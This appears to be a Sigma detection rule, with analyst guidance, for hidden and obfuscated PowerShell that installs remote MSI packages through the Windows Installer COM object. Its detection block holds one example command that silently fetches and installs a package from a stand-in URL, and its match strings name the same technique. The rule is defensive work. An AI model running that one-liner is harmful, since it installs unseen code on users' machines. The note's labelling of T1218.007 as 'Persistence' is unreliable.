title: Obfuscated PowerShell MSI Install via WindowsInstaller COM
id: 7b6a7418-3afc-11f0-aff4-000d3abf478c
status: experimental
description: |
  Detects the execution of obfuscated PowerShell commands that attempt to install MSI packages via the Windows Installer COM object (`WindowsInstaller.Installer`).
  The technique involves manipulating strings to hide functionality, such as constructing class names using string insertion (e.g., 'indowsInstaller.Installer'.Insert(0,'W')) and correcting
  malformed URLs (e.g., converting 'htps://' to 'https://') at runtime. This behavior is commonly associated with malware loaders or droppers that aim to bypass static detection
  by hiding intent in runtime-generated strings and using legitimate tools for code execution. The use of `InstallProduct` and COM object creation, particularly combined with
  hidden window execution and suppressed UI, indicates an attempt to install software (likely malicious) without user interaction.
references:
- https://informationsecuritybuzz.com/the-real-danger-behind-a-simple-windows-shortcut/
- https://redcanary.com/blog/threat-intelligence/intelligence-insights-may-2025/
- https://www.virustotal.com/gui/file/f9710b0ba4de5fa0e7ec27da462d4d2fc6838eba83a19f23f6617a466bbad457
author: Meroujan Antonyan (vx3r)
date: 2025-05-27
tags:
- attack.defense-evasion
- attack.t1027.010
- attack.t1218.007
- attack.execution
- attack.t1059.001
logsource:
  category: process_creation
  product: windows
detection:
    # Example: "C:\Windows\system32\WindowsPowerShell\v1.0\PowerShell.exe" -W Hidden -C "$u='htps://example.com/';$i=New-Object -ComObject('indowsInstaller.Installer'.Insert(0,'W'));$i.UILevel=2;$i.InstallProduct($(if($u.StartsWith('htps://')){$u.Insert(2,'t')}else{$u}),'')";
  selection_img:
  - Image|endswith:
    - '\powershell_ise.exe'
    - '\powershell.exe'
    - '\pwsh.exe'
  - OriginalFileName:
    - 'PowerShell_ISE.EXE'
    - 'PowerShell.EXE'
    - 'pwsh.dll'
  selection_cli:
    CommandLine|contains|all:
    - '-ComObject'
    - 'InstallProduct('
    - '.Insert('
    - 'UILevel'
  condition: all of selection_*
falsepositives:
- Unknown
level: high
note: |
  ### Technical Context
  This detection rule identifies potentially malicious activity involving the execution of obfuscated PowerShell commands that attempt to install MSI packages through the Windows Installer COM object (`WindowsInstaller.Installer`). Attackers may leverage this method to conceal their intentions, manipulating command strings at runtime to evade static detection mechanisms. By utilizing legitimate Windows tools like PowerShell for executing these commands, attackers can bypass user awareness and install malicious software without direct user interaction.

  The behavior defined by this rule is often associated with malware delivery mechanisms, such as loaders or droppers, that utilize obfuscation techniques to hide the true intent of their operations. The specific tactics and techniques involved align with MITRE ATT&CK framework, notably:
  - **Defense Evasion (T1027)**: Obfuscated files or information
  - **Execution (T1059.001)**: PowerShell
  - **Persistence (T1218.007)**: Signed binary proxy execution

  Primary data sources relevant for this detection include process creation events from Windows, which provide insights into executed commands and their parameters, as well as any associated activities in the system event logs.

  ### Investigation Steps
  - **Review Process Creation Logs**: Examine logs related to process creation events, focusing on instances where PowerShell (`powershell.exe`, `powershell_ise.exe`, or `pwsh.exe`) is invoked. Look for obfuscation patterns in command-line arguments indicating attempts to conceal activity.
  - **Analyze Command Line Arguments**: Identify any instances where the command line includes the `-ComObject`, `InstallProduct(`, or `.Insert(` parameters, as these are indicative of attempts to manipulate the Windows Installer COM object through PowerShell.
  - **Check for Suspicious MSI Installations**: Investigate any MSI packages that were installed around the same timeframe as the flagged PowerShell invocations, particularly those sourced from untrusted URLs.
  - **Correlate with User Activity**: Determine if the identified PowerShell executions coincide with any unusual user activity, such as accessing suspicious websites or running scripts not common in regular operational workflows.

  ### Prioritization
  Given the potential for significant impact from a successful malware installation and the stealthy nature of the obfuscation techniques employed, alerts triggered by this rule should be treated with high severity. The likelihood of this behavior correlating with malicious intent raises the priority for immediate investigation.

  ### Blind Spots and Assumptions
  This rule may not capture all instances of PowerShell obfuscation due to potential variations in command execution patterns or the use of different scripting tools. It assumes that process creation logs are properly configured to log command-line arguments, which may not be the case in all environments. If the detection relies on specific PowerShell versions, discrepancies in system configurations could also impede accurate identification. Additional logs from systems monitoring for application installations could enhance coverage and reduce false negatives in detection capabilities.

